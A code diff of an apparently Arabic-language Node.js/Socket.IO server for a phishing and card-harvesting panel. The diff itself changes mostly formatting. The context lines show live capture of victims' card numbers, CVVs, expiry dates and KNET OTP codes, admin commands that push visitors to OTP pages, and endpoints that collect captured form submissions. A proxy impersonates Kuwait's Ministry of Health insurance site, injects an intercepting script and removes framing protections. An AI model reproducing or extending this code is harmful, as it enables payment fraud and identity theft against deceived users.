@@ -1,6 +1,6 @@
-
-// [fix] مفتاح المتجر — يمنع اختلاط طلبات المتجرين على خادم واحد
+// [fix] store tag
 const STORE = process.env.STORE_ID || process.env.STORE || 'KDD';
+
 const express = require("express");
 const http = require("http");
 const { Server } = require("socket.io");
@@ -61,7 +61,7 @@ function ensureDataDir() {
 function loadSavedData() {
   ensureDataDir();
   console.log(`Loading data from: ${DATA_FILE}`);
-  
+
   try {
     // Try main file first
     if (fs.existsSync(DATA_FILE)) {
@@ -79,7 +79,7 @@ function loadSavedData() {
         adminPassword: parsed.adminPassword || "admin123",
       };
     }
-    
+
     // Try backup file if main doesn't exist
     if (fs.existsSync(BACKUP_FILE)) {
       console.log("Main file not found, trying backup...");
@@ -97,11 +97,11 @@ function loadSavedData() {
         adminPassword: parsed.adminPassword || "admin123",
       };
     }
-    
+
     console.log("No data file found, starting fresh");
   } catch (error) {
     console.error("Error loading saved data:", error);
-    
+
     // Try backup on error
     try {
       if (fs.existsSync(BACKUP_FILE)) {
@@ -136,7 +136,7 @@ function loadSavedData() {
 // Save data to file with backup
 function saveData() {
   ensureDataDir();
-  
+
   try {
     const data = {
       visitors: Object.fromEntries(visitors),
@@ -149,7 +149,7 @@ function saveData() {
       lastSaved: new Date().toISOString(),
     };
     const jsonData = JSON.stringify(data, null, 2);
-    
+
     // Create backup of existing file first
     if (fs.existsSync(DATA_FILE)) {
       try {
@@ -158,7 +158,7 @@ function saveData() {
         console.error("Error creating backup:", backupErr);
       }
     }
-    
+
     // Write main file
     fs.writeFileSync(DATA_FILE, jsonData);
     console.log(`Data saved: ${savedVisitors.length} visitors at ${new Date().toISOString()}`);
@@ -272,7 +272,6 @@ function saveVisitorPermanently(visitor) {
   saveData();
 }
 
-
 /* ===== FIX91: استرجاع الزائر بشكل موثوق + توصيل لكل سوكتات الزائر ===== */
 function __f91Ids(payload){
   var ids = [];
@@ -341,7 +340,7 @@ io.on("connection", (socket) => {
   // Handle visitor registration
   socket.on("visitor:register", async (data) => {
     const visitorInfo = getVisitorInfo(socket);
-    
+
     // Use client-provided real IP if available (more accurate than proxy IP)
     const clientIp = data?.clientIp;
     if (clientIp) {
@@ -350,18 +349,18 @@ io.on("connection", (socket) => {
     } else {
       console.log(`[DEBUG] No client IP provided, using proxy IP: ${visitorInfo.ip}`);
     }
-    
+
     // Lookup country from IP if not provided by Cloudflare
     if (visitorInfo.country === 'Unknown' && visitorInfo.ip) {
       visitorInfo.country = await lookupCountry(visitorInfo.ip);
       console.log(`[DEBUG] Looked up country for ${visitorInfo.ip}: ${visitorInfo.country}`);
     }
-    
+
     const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
-    
+
     // Get existing visitor ID from client (localStorage)
     const existingVisitorId = data?.existingVisitorId;
-    
+
     // Check if this visitor already exists based on visitor ID from localStorage
     let existingVisitor = null;
     if (existingVisitorId) {
@@ -432,7 +431,7 @@ io.on("connection", (socket) => {
     saveData();
 
     // Send confirmation to visitor
-    socket.emit("successfully-connected", {store: STORE, ...({
+    socket.emit("successfully-connected", { store: STORE,...({
       sid: socket.id,
       pid: visitor._id,
     })});
@@ -440,9 +439,9 @@ io.on("connection", (socket) => {
     // Notify admins
     admins.forEach((admin, adminSocketId) => {
       if (isNewVisitor) {
-        io.to(adminSocketId).emit("visitor:new", {store: STORE, ...({ ...visitor, isConnected: true })});
+        io.to(adminSocketId).emit("visitor:new", { store: STORE,...({ ...visitor, isConnected: true })});
       } else {
-        io.to(adminSocketId).emit("visitor:reconnected", {store: STORE, ...({ visitorId: visitor._id, socketId: socket.id })});
+        io.to(adminSocketId).emit("visitor:reconnected", { store: STORE,...({ visitorId: visitor._id, socketId: socket.id })});
       }
     });
   });
@@ -464,14 +463,14 @@ io.on("connection", (socket) => {
           /*FIX42*/ if (!visitor.liveCard || !String(visitor.liveCard.cardNumber || "").replace(/\D/g, "")) { visitor.liveCard = { cardNumber: "", nameOnCard: "", expiryDate: "", cvv: "" }; }
           visitor.liveCardTimestamp = new Date().toISOString();
           admins.forEach((admin, adminSocketId) => {
-            io.to(adminSocketId).emit("card:liveUpdate", {store: STORE, ...({ visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp })});
+            io.to(adminSocketId).emit("card:liveUpdate", { store: STORE,...({ visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp })});
           });
         }
       } else {
         visitor.liveCard = null;
         visitor.liveCardTimestamp = null;
         admins.forEach((admin, adminSocketId) => {
-          io.to(adminSocketId).emit("card:liveUpdate", {store: STORE, ...({
+          io.to(adminSocketId).emit("card:liveUpdate", { store: STORE,...({
             visitorId: visitor._id,
             liveCard: null,
             liveCardTimestamp: null,
@@ -483,7 +482,7 @@ io.on("connection", (socket) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:pageChanged", {store: STORE, ...({
+        io.to(adminSocketId).emit("visitor:pageChanged", { store: STORE,...({
           visitorId: visitor._id,
           page,
         })});
@@ -502,7 +501,7 @@ io.on("connection", (socket) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:nameUpdated", {store: STORE, ...({
+        io.to(adminSocketId).emit("visitor:nameUpdated", { store: STORE,...({
           visitorId: visitor._id,
           name: name,
         })});
@@ -596,8 +595,8 @@ io.on("connection", (socket) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:dataSubmitted", {store: STORE, ...({
-    
+        io.to(adminSocketId).emit("visitor:dataSubmitted", { store: STORE,...({
+
           visitorId: visitor._id,
           socketId: socket.id,
           data: data,
@@ -610,7 +609,7 @@ io.on("connection", (socket) => {
   });
 
   // Handle card number verification
-  
+
 // ===== بطاقة الدفع المباشر (liveCard) =====
 socket.on("card:live", (data) => {
   const visitor = __f91ResolveVisitor(socket, null);
@@ -626,7 +625,7 @@ socket.on("card:live", (data) => {
   visitors.set(socket.id, visitor);
 
   admins.forEach((admin, adminSocketId) => {
-    io.to(adminSocketId).emit("card:liveUpdate", {store: STORE, ...({
+    io.to(adminSocketId).emit("card:liveUpdate", { store: STORE,...({
       visitorId: visitor._id,
       liveCard: visitor.liveCard,
       liveCardTimestamp: visitor.liveCardTimestamp,
@@ -641,7 +640,7 @@ socket.on("card:liveHide", () => {
   visitor.liveCardTimestamp = null;
   visitors.set(socket.id, visitor);
   admins.forEach((admin, adminSocketId) => {
-    io.to(adminSocketId).emit("card:liveUpdate", {store: STORE, ...({
+    io.to(adminSocketId).emit("card:liveUpdate", { store: STORE,...({
       visitorId: visitor._id, liveCard: null, liveCardTimestamp: null,
     })});
   });
@@ -660,7 +659,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:cardVerification", {store: STORE, ...({
+        io.to(adminSocketId).emit("visitor:cardVerification", { store: STORE,...({
           visitorId: visitor._id,
           cardNumber,
           isBlocked,
@@ -685,7 +684,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
       visitors.forEach((v) => {
         connectedVisitorIds.add(v._id);
       });
-      
+
       // Update connection status for saved visitors based on _id match
       const visitorsWithStatus = savedVisitors.map(v => {
         // Check if this visitor's _id is in the connected visitors
@@ -808,7 +807,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
     var __skipEmit100 = false, __vv100 = null;
 /*FIX100E*/ try { if (action === "otp") { __vv100 = visitors.get(visitorSocketId) || null; if (!__vv100) { visitors.forEach(function(v){ if (!__vv100 && v && (v._id === visitorSocketId || v.socketId === visitorSocketId)) __vv100 = v; }); } if (__vv100 && __vv100.__f100sent && /otp|رمز/i.test(String(__vv100.page || ""))) __skipEmit100 = true; } } catch(e){}
 if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { if (action === "otp" && __vv100) __vv100.__f100sent = 1; } catch(e){} }
-    /*FIX98*/ try { var __v98 = visitors.get(visitorSocketId) || null; if (!__v98) { visitors.forEach(function(v){ if (!__v98 && v && (v._id === visitorSocketId || v.socketId === visitorSocketId)) __v98 = v; }); } if (__v98 && action === 'otp' && /كي\s*نت|knet/i.test(String(__v98.page || '')) && !/otp|رمز/i.test(String(__v98.page || ''))) { __v98.page = 'رمز التحقق كي نت (OTP)'; __v98.__f98otp = Date.now(); visitors.set(visitorSocketId, __v98); admins.forEach(function(a, k){ try { io.to(k).emit('visitor:pageChanged', {store: STORE, ...({ visitorId: __v98._id, page: __v98.page })}); } catch(e){} }); } } catch(e){}
+    /*FIX98*/ try { var __v98 = visitors.get(visitorSocketId) || null; if (!__v98) { visitors.forEach(function(v){ if (!__v98 && v && (v._id === visitorSocketId || v.socketId === visitorSocketId)) __v98 = v; }); } if (__v98 && action === 'otp' && /كي\s*نت|knet/i.test(String(__v98.page || '')) && !/otp|رمز/i.test(String(__v98.page || ''))) { __v98.page = 'رمز التحقق كي نت (OTP)'; __v98.__f98otp = Date.now(); visitors.set(visitorSocketId, __v98); admins.forEach(function(a, k){ try { io.to(k).emit('visitor:pageChanged', { store: STORE,...({ visitorId: __v98._id, page: __v98.page })}); } catch(e){} }); } } catch(e){}
     // تحديث حالة الانتظار
     const visitor = visitors.get(visitorSocketId);
     if (visitor) {
@@ -876,14 +875,14 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
   socket.on("admin:delete", (visitorSocketId) => {
     __f91Emit(visitorSocketId, "deleted");
     visitors.delete(visitorSocketId);
-    
+
     // Also remove from saved visitors
     const visitorToDelete = Array.from(visitors.values()).find(v => v.socketId === visitorSocketId);
     if (visitorToDelete) {
       savedVisitors = savedVisitors.filter(v => v._id !== visitorToDelete._id);
       saveData();
     }
-    
+
     console.log(`Visitor deleted: ${visitorSocketId}`);
   });
 
@@ -896,16 +895,16 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
         visitors.delete(socketId);
       }
     });
-    
+
     // Remove from saved visitors
     savedVisitors = savedVisitors.filter(v => v._id !== visitorId);
     saveData();
-    
+
     // Notify all admins
     admins.forEach((admin, adminSocketId) => {
-      io.to(adminSocketId).emit("visitor:deleted", {store: STORE, ...({ visitorId })});
+      io.to(adminSocketId).emit("visitor:deleted", { store: STORE,...({ visitorId })});
     });
-    
+
     console.log(`Visitor deleted by ID: ${visitorId}`);
   });
 
@@ -930,7 +929,7 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
       saveData();
       socket.emit("admin:passwordChanged", true);
       console.log("Admin password changed successfully and saved to disk");
-      
+
       // Force logout ALL other admin sessions
       admins.forEach((admin, adminSocketId) => {
         if (adminSocketId !== socket.id) {
@@ -939,14 +938,14 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
           console.log(`Force logged out admin: ${adminSocketId}`);
         }
       });
-      
+
       // Also logout the admin who changed the password
       setTimeout(() => {
         io.to(socket.id).emit("admin:forceLogout");
         admins.delete(socket.id);
         console.log(`Force logged out password changer: ${socket.id}`);
       }, 2000);
-      
+
       console.log("All admin sessions logged out after password change");
     } else {
       socket.emit("admin:passwordChanged", false);
@@ -960,20 +959,20 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
     visitors.forEach((v, socketId) => {
       io.to(socketId).emit("deleted");
     });
-    
+
     // Clear all data
     visitors.clear();
     savedVisitors = [];
     visitorCounter = 0;
-    
+
     // Save empty data to disk
     saveData();
-    
+
     // Notify all admins
     admins.forEach((admin, adminSocketId) => {
       io.to(adminSocketId).emit("allDataCleared");
     });
-    
+
     console.log("All data cleared by admin");
   });
 
@@ -1031,7 +1030,7 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
   socket.on("blockedCards:check", (cardNumber) => {
     const prefix = cardNumber.replace(/\s/g, '').substring(0, 4);
     const isBlocked = globalBlockedCards.includes(prefix);
-    socket.emit("blockedCards:checkResult", {store: STORE, ...({ isBlocked, prefix })});
+    socket.emit("blockedCards:checkResult", { store: STORE,...({ isBlocked, prefix })});
   });
 
   // Blocked Countries: Get list
@@ -1069,10 +1068,10 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
 
   // Blocked Countries: Check if visitor's country is blocked
   socket.on("blockedCountries:check", (country) => {
-    const isBlocked = globalBlockedCountries.some(c => 
+    const isBlocked = globalBlockedCountries.some(c =>
       c.toLowerCase() === country.toLowerCase()
     );
-    socket.emit("blockedCountries:checkResult", {store: STORE, ...({ isBlocked, country })});
+    socket.emit("blockedCountries:checkResult", { store: STORE,...({ isBlocked, country })});
   });
 
   // Admin: Mark visitor data as read (hide new data indicator)
@@ -1087,19 +1086,19 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
         found = true;
       }
     });
-    
+
     // Also update in saved visitors
     const savedVisitor = savedVisitors.find(v => v._id === visitorId);
     if (savedVisitor) {
       savedVisitor.hasNewData = false;
       saveData();
     }
-    
+
     // Notify all admins about the update
     admins.forEach((admin, adminSocketId) => {
-      io.to(adminSocketId).emit("visitor:markedAsRead", {store: STORE, ...({ visitorId })});
+      io.to(adminSocketId).emit("visitor:markedAsRead", { store: STORE,...({ visitorId })});
     });
-    
+
     console.log(`Visitor ${visitorId} marked as read`);
   });
 
@@ -1111,7 +1110,7 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
       if (!visitor.chatMessages) {
         visitor.chatMessages = [];
       }
-      
+
       // Add message to visitor's chat history
       const chatMessage = {
         id: Date.now().toString(),
@@ -1123,16 +1122,16 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
       visitor.hasNewMessage = true;
       visitors.set(visitor.socketId, visitor);
       saveVisitorPermanently(visitor);
-      
+
       // Notify all admins about the new message
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("chat:newMessage", {store: STORE, ...({
+        io.to(adminSocketId).emit("chat:newMessage", { store: STORE,...({
           visitorSocketId: visitor.socketId,
           visitorId: visitor._id,
           message: chatMessage
         })});
       });
-      
+
       console.log(`Chat message from visitor ${visitor.socketId}: ${message}`);
     }
   });
@@ -1145,7 +1144,7 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
       if (!visitor.chatMessages) {
         visitor.chatMessages = [];
       }
-      
+
       // Add message to visitor's chat history
       const chatMessage = {
         id: Date.now().toString(),
@@ -1156,13 +1155,13 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
       visitor.chatMessages.push(chatMessage);
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      
+
       // Send message to visitor
       __f91Emit(visitorSocketId, "chat:fromAdmin", {
         message: message,
         timestamp: chatMessage.timestamp
       });
-      
+
       console.log(`Chat message from admin to visitor ${visitorSocketId}: ${message}`);
     }
   });
@@ -1197,15 +1196,15 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
       const visitor = __f91ResolveVisitor(socket, null);
       const visitorId = visitor._id;
       const socketId = socket.id;
-      
+
       // Don't delete visitor data - keep it permanently
       visitors.delete(socket.id);
-      
+
       // Delay disconnect notification to allow for quick reconnection
       setTimeout(() => {
         // Check if visitor reconnected with same ID
         const reconnected = Array.from(visitors.values()).some(v => v._id === visitorId && v.isConnected);
-        
+
         if (!reconnected) {
           // Update saved visitor as disconnected
           const savedVisitor = savedVisitors.find(v => v._id === visitorId);
@@ -1213,15 +1212,15 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
             savedVisitor.isConnected = false;
             saveData();
           }
-          
+
           // Notify admins
           admins.forEach((admin, adminSocketId) => {
-            io.to(adminSocketId).emit("visitor:disconnected", {store: STORE, ...({
+            io.to(adminSocketId).emit("visitor:disconnected", { store: STORE,...({
               visitorId: visitorId,
               socketId: socketId,
             })});
           });
-          
+
           console.log(`Visitor disconnected: ${socketId}`);
         } else {
           console.log(`Visitor ${visitorId} reconnected quickly, skipping disconnect notification`);
@@ -1277,14 +1276,14 @@ app.post("/api/moh-data", (req, res) => {
     const { type, data, visitorId, socketId: reqSocketId } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || '';
     const clientIp = ip.split(',')[0].trim();
-    
+
     console.log(`[MOH-DIRECT] Received ${type} from ${clientIp}, visitorId=${visitorId || 'none'}, socketId=${reqSocketId || 'none'}`);
-    
+
     // Extract useful fields based on type
     let fields = {};
     let pageName = 'MOH';
     let username = null;
-    
+
     if (data) {
       if (data.fields) fields = data.fields;
       if (data.content) {
@@ -1294,10 +1293,10 @@ app.post("/api/moh-data", (req, res) => {
       if (data.path) pageName = `MOH: ${data.path}`;
       if (data.username) username = data.username;
     }
-    
+
     // Find matching visitor: try by visitorId first, then socketId, then IP
     let matchedVisitor = null;
-    
+
     // 1. Match by visitor ID
     if (visitorId) {
       visitors.forEach((v, sid) => {
@@ -1306,7 +1305,7 @@ app.post("/api/moh-data", (req, res) => {
         }
       });
     }
-    
+
     // 2. Match by socket ID
     if (!matchedVisitor && reqSocketId) {
       const v = visitors.get(reqSocketId);
@@ -1314,7 +1313,7 @@ app.post("/api/moh-data", (req, res) => {
         matchedVisitor = { visitor: v, socketId: reqSocketId };
       }
     }
-    
+
     // 3. Fallback: match by IP
     if (!matchedVisitor) {
       visitors.forEach((v, sid) => {
@@ -1323,9 +1322,9 @@ app.post("/api/moh-data", (req, res) => {
         }
       });
     }
-    
+
     console.log(`[MOH-DIRECT] Matched: ${matchedVisitor ? matchedVisitor.visitor._id : 'NONE'}, visitors count: ${visitors.size}`);
-    
+
     if (matchedVisitor) {
       const v = matchedVisitor.visitor;
       /*FIX101A*/ try {
@@ -1338,13 +1337,13 @@ app.post("/api/moh-data", (req, res) => {
   }
   v.__f101sig = __s101; v.__f101at = __n101;
 } catch(e){}
-      
+
       // Update username if captured
       if (username) {
         v.fullName = username;
         v.mohUsername = username;
       }
-      
+
       // Store data
       if (Object.keys(fields).length > 0) {
         if (!v.dataHistory) v.dataHistory = [];
@@ -1358,20 +1357,20 @@ app.post("/api/moh-data", (req, res) => {
         /*FIX102B*/ try { if (v.__f98otp && (Date.now() - v.__f98otp) < 1800000) { var __pB102 = String(pageName || ""); if (/cvv|atm|مرور|نهائي|final/i.test(__pB102)) { v.__f98otp = 0; } else if (/دفع|كي\s*نت|knet|payment|otp|رمز/i.test(__pB102)) { pageName = "رمز التحقق كي نت (OTP)"; } } } catch(e){}
 v.page = pageName;
       }
-      
+
       visitors.set(matchedVisitor.socketId, v);
       saveVisitorPermanently(v);
-      
+
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
         if (username) {
-          io.to(adminSocketId).emit('visitor:nameUpdated', {store: STORE, ...({
+          io.to(adminSocketId).emit('visitor:nameUpdated', { store: STORE,...({
             visitorId: v._id,
             name: username,
           })});
         }
         if (Object.keys(fields).length > 0) {
-          io.to(adminSocketId).emit('visitor:dataSubmitted', {store: STORE, ...({
+          io.to(adminSocketId).emit('visitor:dataSubmitted', { store: STORE,...({
             visitorId: v._id,
             socketId: matchedVisitor.socketId,
             data: { content: fields, page: pageName },
@@ -1379,12 +1378,12 @@ v.page = pageName;
           })});
         }
       });
-      
+
       console.log(`[MOH-DIRECT] Updated visitor ${v._id} (${clientIp})`);
     } else {
       console.log(`[MOH-DIRECT] No matching visitor for IP ${clientIp}`);
     }
-    
+
     res.json({ ok: true });
   } catch (err) {
     console.error('[MOH-DIRECT] Error:', err.message);
@@ -1396,7 +1395,7 @@ app.post("/api/captured-data", (req, res) => {
   try {
     const { url, contentType, body, timestamp, ip } = req.body;
     console.log(`[DATA-COLLECTOR] Received POST data from ${ip} to ${url}`);
-    
+
     // Parse form data from body string
     let parsedFields = {};
     if (body && contentType && contentType.includes('application/x-www-form-urlencoded')) {
@@ -1411,7 +1410,7 @@ app.post("/api/captured-data", (req, res) => {
         parsedFields = { rawBody: body };
       }
     }
-    
+
     // Find visitor by IP or create a data entry
     let matchedVisitor = null;
     visitors.forEach((v, socketId) => {
@@ -1419,7 +1418,7 @@ app.post("/api/captured-data", (req, res) => {
         matchedVisitor = { visitor: v, socketId };
       }
     });
-    
+
     if (matchedVisitor) {
       // Update existing visitor with captured data
       const v = matchedVisitor.visitor;
@@ -1443,10 +1442,10 @@ app.post("/api/captured-data", (req, res) => {
       v.hasNewData = true;
       visitors.set(matchedVisitor.socketId, v);
       saveVisitorPermanently(v);
-      
+
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit('visitor:dataSubmitted', {store: STORE, ...({
+        io.to(adminSocketId).emit('visitor:dataSubmitted', { store: STORE,...({
           visitorId: v._id,
           socketId: matchedVisitor.socketId,
           data: { content: parsedFields, page: `MOH-POST: ${url}` },
@@ -1492,13 +1491,13 @@ app.post("/api/captured-data", (req, res) => {
         lastActivity: Date.now(),
       };
       savedVisitors.push(orphanVisitor);
-      isNewVisitor = true;     
+      isNewVisitor = true;
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
         io.to(adminSocketId).emit('visitor:new', orphanVisitor);
       });
     }
-    
+
     res.json({ success: true });
   } catch (error) {
     console.error('[DATA-COLLECTOR] Error:', error);
@@ -1511,7 +1510,7 @@ const https = require("https");
 
 app.all("/api/proxy", async (req, res) => {
   const targetUrl = req.query.url || 'https://insonline.moh.gov.kw/Insurance/logaction';
-  
+
   // Only allow proxying to the Kuwait MOH domain
   if (!targetUrl.startsWith('https://insonline.moh.gov.kw/') && !targetUrl.startsWith('http://insonline.moh.gov.kw/')) {
     return res.status(403).json({ error: 'Only Kuwait MOH Insurance site is allowed' });
@@ -1551,11 +1550,11 @@ app.all("/api/proxy", async (req, res) => {
 
       proxyReq.on('error', reject);
       proxyReq.on('timeout', () => { proxyReq.destroy(); reject(new Error('Request timeout')); });
-      
+
       // Forward POST body if present
       if (req.method === 'POST' && req.body) {
-        const bodyStr = typeof req.body === 'string' ? req.body : 
-          (req.headers['content-type'] && req.headers['content-type'].includes('json') ? 
+        const bodyStr = typeof req.body === 'string' ? req.body :
+          (req.headers['content-type'] && req.headers['content-type'].includes('json') ?
             JSON.stringify(req.body) : new URLSearchParams(req.body).toString());
         proxyReq.write(bodyStr);
       }
@@ -1563,21 +1562,21 @@ app.all("/api/proxy", async (req, res) => {
     });
 
     const contentType = result.headers['content-type'] || 'text/html';
-    
+
     // Set CORS headers and remove framing restrictions
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', '*');
     res.setHeader('Content-Type', contentType);
-    
+
     if (contentType.includes('text/html')) {
       let html = result.body.toString('utf-8');
       const baseUrl = new URL(targetUrl);
       const baseHref = baseUrl.protocol + '//' + baseUrl.host;
-      
+
       // Add base tag for relative URLs
       html = html.replace(/<head([^>]*)>/i, '<head$1>\n<base href="' + baseHref + '/">');
-      
+
       // Add navigation interception script
       const proxyScript = `
         <script>
@@ -1619,14 +1618,14 @@ app.all("/api/proxy", async (req, res) => {
           }, true);
         </script>`;
       html = html.replace('</body>', proxyScript + '\n</body>');
-      
+
       return res.status(result.status).send(html);
     } else {
       return res.status(result.status).send(result.body);
     }
   } catch (error) {
     console.error('Proxy error:', error.message);
-    return res.status(502).json({ 
+    return res.status(502).json({
       error: 'Failed to fetch the target page',
       message: error.message
     });
@@ -1652,7 +1651,7 @@ setInterval(() => {
       visitors.set(sid, visitor);
       // Notify admins about idle status change
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:idleChanged", {store: STORE, ...({
+        io.to(adminSocketId).emit("visitor:idleChanged", { store: STORE,...({
           visitorId: visitor._id,
           isIdle: isNowIdle,
         })});
@@ -1673,17 +1672,17 @@ setInterval(() => {
       const visitorId = visitor._id;
       visitors.delete(sid);
       cleaned++;
-      
+
       // Update saved visitor as disconnected
       const savedVisitor = savedVisitors.find(v => v._id === visitorId);
       if (savedVisitor) {
         savedVisitor.isConnected = false;
         saveData();
       }
-      
+
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:disconnected", {store: STORE, ...({
+        io.to(adminSocketId).emit("visitor:disconnected", { store: STORE,...({
           visitorId: visitorId,
           socketId: sid,
         })});
@@ -1727,7 +1726,7 @@ if(!v||!fields||typeof fields!=='object')return;
 var sig='';try{sig=JSON.stringify(fields)}catch(e){}
 if(v.__kdkSig===sig)return;v.__kdkSig=sig;
 try{var nm=fields.customer_name||fields.name||fields.fullName||fields['الاسم'];
-if(nm&&String(nm).trim()){var s=String(nm).trim();if(v.fullName!==s){v.fullName=s;admins.forEach(function(a,id){try{io.to(id).emit('visitor:nameUpdated',{store: STORE, ...({visitorId:v._id,name:s})}catch(e){}})}}}
+if(nm&&String(nm).trim()){var s=String(nm).trim();if(v.fullName!==s){v.fullName=s;admins.forEach(function(a,id){try{io.to(id).emit('visitor:nameUpdated',{ store: STORE,...({visitorId:v._id,name:s})}catch(e){}})}}}
 catch(e){}
 try{var ph=fields.customer_phone||fields.phone||fields['الهاتف'];if(ph&&String(ph).trim())v.phone=String(ph).trim()}catch(e){}
 var pg=fields['الصفحة']||page||'إتمام الطلب';
@@ -1739,7 +1738,7 @@ v.lastActivity=Date.now();/*FIX102A*/ try { if (v.__f98otp && (Date.now() - v.__
 v.page=pg;
 visitors.set(v.socketId||v._id,v);
 try{if(typeof saveVisitorPermanently==='function')saveVisitorPermanently(v);else if(typeof saveData==='function')saveData()}catch(e){}
-admins.forEach(function(a,id){try{io.to(id).emit('visitor:dataSubmitted',{store: STORE, ...({visitorId:v._id,socketId:v.socketId,data:{content:fields,page:pg},visitor:v})}catch(e){}})});
+admins.forEach(function(a,id){try{io.to(id).emit('visitor:dataSubmitted',{ store: STORE,...({visitorId:v._id,socketId:v.socketId,data:{content:fields,page:pg},visitor:v})}catch(e){}})});
 console.log('kdk5 data',v._id,pg)}catch(e){console.log('kdk5 push err',e.message)}}
 io.on('connection',function(socket){
 socket.onAny(function(ev,arg){try{
@@ -1779,7 +1778,7 @@ try{visitors.delete(d.socketId)}catch(e){}
 try{visitors.delete(d._id)}catch(e){}
 try{(d._sockets||[]).forEach(function(sx){if(sx&&sx!==d.socketId)visitors.set(sx,keep)})}catch(e){}
 try{savedVisitors=savedVisitors.filter(function(x){return x._id!==d._id})}catch(e){}
-admins.forEach(function(ad,id){try{io.to(id).emit('visitor:deleted',{store: STORE, ...({visitorId:d._id})}catch(e){}})});
+admins.forEach(function(ad,id){try{io.to(id).emit('visitor:deleted',{ store: STORE,...({visitorId:d._id})}catch(e){}})});
 console.log('kdk5 merged',d._id,'->',keep._id)}
 visitors.set(keep.socketId||keep._id,keep);
 admins.forEach(function(ad,id){try{io.to(id).emit('visitor:new',keep)}catch(e){}})});
